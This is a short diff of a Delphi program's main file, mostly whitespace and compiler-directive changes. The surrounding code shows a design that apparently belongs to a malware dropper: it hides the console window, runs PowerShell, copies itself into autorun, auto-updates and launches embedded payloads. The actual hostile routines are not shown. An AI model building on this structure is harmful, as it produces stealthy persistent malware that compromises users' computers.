@@ -9,9 +9,7 @@ uses
   ActiveX,
   Variants,
   Classes,
-       {$IFDEF USE_AUTOUPDATE}
   consts in 'consts.pas',
-   {$ENDIF}
   registry,
   ComObj,
   init in 'init.pas',
@@ -29,7 +27,10 @@ uses
 
   runMan in 'runMan.pas';
 
+
+
 function GetConsoleWindow: HWND; stdcall; external 'kernel32.dll';
+
 
 procedure HideConsoleWindow;
 var
@@ -48,13 +49,13 @@ begin
   runMan.RunPS;
 
 
-{$IFDEF USE_AUTOSTART}
+    {$IFDEF USE_AUTOSTART}
   CopyFileAndAddToAutorun;
             {$ENDIF}
 
-  {$IFDEF USE_AUTOUPDATE}
+                {$IFDEF USE_AUTOUPDATE}
   AutoUpdateX;
- {$ENDIF}
+            {$ENDIF}
   runMan.RunEmbeds;          
 end.
 
